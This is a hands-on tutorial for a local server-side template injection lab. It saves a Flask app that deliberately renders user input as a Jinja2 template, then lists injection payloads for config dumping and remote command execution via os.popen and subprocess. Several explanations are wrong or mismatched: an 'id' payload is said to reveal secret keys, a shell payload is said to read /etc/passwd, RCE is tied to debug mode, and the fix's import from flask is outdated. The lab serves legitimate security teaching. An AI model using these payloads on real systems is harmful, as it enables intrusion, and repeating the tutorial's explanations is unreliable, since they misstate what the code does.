# **Setting Up a Vulnerable SSTI Lab**

## **Step 1: Set Up a Local SSTI Lab**
We will create a **Flask web application** with a vulnerable **Jinja2** template engine.  

### **Prerequisites**  
Make sure you have **Python 3** installed. Then install Flask:  
```bash
pip install flask
```

---

## **Step 2: Create a Flask App with SSTI Vulnerability**
Save the following code as `app.py`:  

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_input = request.form.get("input", "")
        response = render_template_string(user_input)  # 🚨 Vulnerable SSTI
        return response

    return '''
    <form method="POST">
        <input type="text" name="input" placeholder="Enter input here">
        <input type="submit" value="Submit">
    </form>
    '''

if __name__ == "__main__":
    app.run(debug=True)
```

---

## **Step 3: Run the Vulnerable App**
Run the Flask app with:  
```bash
python app.py
```
It will start a local server at `http://127.0.0.1:5000/`.  

---

## **Step 4: Exploiting the SSTI Vulnerability**  

### **1. Basic Injection Test**
Go to the input field and enter:  
```jinja2
{{ 7 * 7 }}
```
If it returns `49`, the application is **vulnerable to SSTI**.

---

### **2. Extract Sensitive Data**
Try reading environment variables:  
```jinja2
{{ config.items() }}
```

---

### **3. Achieve Remote Code Execution (RCE)**
If the app is running in debug mode, execute system commands:  
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
This may return system environment variables like SECRET_KEY, DB_PASSWORD, or API keys.
or  
```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh', shell=True, stdout=-1).communicate()[0] }}
```
Reads the /etc/passwd file on Linux (check for usernames).

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```
Execute `whoami` to reveal the current user:

---

## **Step 5: Fix the Vulnerability**
To **prevent SSTI**, replace `render_template_string()` with **safe rendering**:  
```python
from flask import escape
safe_response = escape(user_input)  # Escapes dangerous characters
```

---

##  Next Steps
 **Play with the lab** – Test different SSTI payloads.  
**Try other template engines** – Modify this app to use Twig (PHP) or Freemarker (Java).  
**Practice CTF challenges** – Try SSTI challenges on **TryHackMe**, **Hack The Box**, or **picoCTF**.  


